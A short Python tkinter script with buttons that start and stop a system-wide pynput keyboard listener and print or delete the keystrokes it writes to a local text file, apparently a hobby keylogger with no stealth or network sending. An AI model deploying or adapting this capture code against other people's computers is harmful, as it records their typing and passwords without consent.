from tkinter import*
import threading
import time
from random import randint
from pynput.keyboard import Listener,Key, Controller
import os
def Key_press(key):
    Keyboard = Controller()
    Keyboard.press(key)
    


def getKey(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        return False
    if key == "Key.space":
        key =" "
    if key == "Key.enter":
        key="\n"
    if key == "Key.tab":
        key="    "
    
    with open("test.txt","a") as file:
        file.write(key)

    

def HOOK():
    print("HOOK")
    with  Listener(on_press = getKey) as listener:
        listener.join()
def A():
    threading.Thread(target=HOOK).start()

def UNHOOK():
    print("UNHOOK")
    Key_press(Key.f12)
def B():
    threading.Thread(target=UNHOOK).start()

def PRINT():
    print("PRINT")
    Key_press(Key.f12)
    with open("test.txt",'r') as f:
        line = f.read()
    print(line)
    os.remove("test.txt")
    A()

def C():
    threading.Thread(target=PRINT).start()

def DELETE():
    print("DELETE")
def D():
    threading.Thread(target=DELETE).start()




RootK =Tk()

RootK.title("LMAO")
RootK.geometry("500x400")

RootK.title(55*" "+"Keystroke")
RootK.grab_set()
RootK.geometry("500x350")

#HOOK
buttonK_HOOK = Button(RootK, text = 'HOOK',padx =33, pady=20, command= A)
buttonK_HOOK.place(x =38, y =15)

#UNLOCK
buttonK_UNLOCK = Button(RootK, text = 'UNHOOK',padx =33, pady=20, command= B)
# buttonK_UNLOCK.bind("<Button-1>", UNLOCK)
buttonK_UNLOCK.place(x =140, y =15)

#PRINT
buttonK_PRINT = Button(RootK, text = 'PRINT',padx =33, pady=20,command=C)
buttonK_PRINT.place(x =245, y =15)

#DELETE
buttonK_DELETE = Button(RootK, text = 'DELETE',padx =33, pady=20, command=D)
buttonK_DELETE.place(x =350, y =15)

#TABLE
text = Text(RootK)
text.place(x = 38, y = 90, width = 425, height = 230)
# text.insert('end', '.....')         
# text.configure(state='disabled')





RootK.mainloop()

